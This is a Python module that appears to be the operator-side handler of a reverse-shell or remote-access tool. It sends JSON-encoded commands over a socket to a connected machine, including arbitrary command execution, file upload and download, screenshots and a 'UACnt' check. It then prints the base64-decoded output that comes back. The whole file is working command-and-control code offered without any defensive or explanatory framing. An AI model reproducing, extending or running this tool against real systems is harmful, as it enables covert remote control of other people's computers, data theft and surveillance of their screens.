#!/usr/bin/python3

import time
import json
import socket
import base64

from .ShellPrompt import ShellPrompt
from .Utils import Utils
from .FileHandlers import FileHandlers

class SocketAction():
    _PORTFWD_POOL = {}
    _PACKET_POOL = b''

    @staticmethod
    def Send(sock, sprompt: ShellPrompt, conn):
        print("[*] Sending process forked successfully")
        while True:
            try:
                if sprompt.GetPrompt() is not None:
                    arguments = sprompt.Prompt(sprompt.GetPrompt())
                    if len(arguments) == 0:
                        continue

                    binary = arguments[0]
                    command_type = ""
                    match binary:
                        case "help":
                            print(Utils.HELP_USAGE)
                            continue
                        case (
                            "whoami" | "UACnt" |
                            "cat" |
                            "rm" | "rmdir" | "mkdir" | "cd" | "ls" |
                            "upload" | "download" |
                            "screenshot"
                        ):
                            command_type = "BUILTIN"
                        case _:
                            command_type = "COMMAND"

                    command = json.dumps({'type': command_type, 'binary': binary, 'arguments': arguments[1:]},separators=(',',':'))
                    conn.send(command.encode())
                    sprompt.SetPrompt(None)

                else:
                    time.sleep(0.1)
            except:
                print("[!] Prompt killed")
                sock.close()
                break

    @staticmethod
    def Recv(conn: socket.socket, sprompt: ShellPrompt):
        print("[*] Receiving process forked successfully")

        while True:
            data = SocketAction.GetNextPacket(conn)

            # Try and receive a JSON packet
            try:
                ddata = json.loads(data.decode('cp437').strip())
                match ddata['status']:
                    case "READY_FOR_INPUT":
                        sprompt.SetPrompt(base64.b64decode(ddata['prompt']).decode('cp437'))

                    case "COMMAND_OUTPUT":
                        print(base64.b64decode(ddata['content']).decode('cp437'), end='')

                    case "READY_FOR_UPLOAD":
                        FileHandlers.Upload(ddata, conn)

                    case "READY_FOR_DOWNLOAD":
                        FileHandlers.Download(ddata, conn)
                    case _:
                        print(f"[!] Unsupported instruction received: {ddata['status']}")

            # Received raw data
            except json.decoder.JSONDecodeError:
                print(f"Could not decode: {data.decode()}")

    @staticmethod
    def GetNextPacket(conn):
        while True:
            if b'}' not in SocketAction._PACKET_POOL:
                newdata = conn.recv(1024)
                SocketAction._PACKET_POOL += newdata
                continue

            index = SocketAction._PACKET_POOL.index(b'}') + 1
            packet = SocketAction._PACKET_POOL[:index]
            SocketAction._PACKET_POOL = SocketAction._PACKET_POOL[index:]
            return (packet)

